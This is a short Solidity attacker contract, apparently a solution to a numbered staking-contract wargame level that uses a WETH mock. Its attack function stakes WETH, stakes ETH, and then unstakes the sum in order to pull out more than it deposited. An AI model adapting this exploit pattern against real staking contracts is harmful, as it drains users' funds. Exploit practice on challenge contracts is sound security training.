// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Stake} from "../contracts/31_Stake.sol";
import {WETHMock} from "../../test/mock/WETHMock.sol";

contract StakeAttacker {
    Stake private stake;
    WETHMock private wethMock;

    constructor(address _stakeAddress, address _wethMockAddress) {
        stake = Stake(_stakeAddress);
        wethMock = WETHMock(_wethMockAddress);
    }

    receive() external payable {}

    function attack() external payable {
        wethMock.approve(address(stake), type(uint256).max);
        stake.StakeWETH(0.001 ether + 1);
        stake.StakeETH{value: msg.value}();
        stake.Unstake(0.001 ether + 1 + msg.value);
    }
}
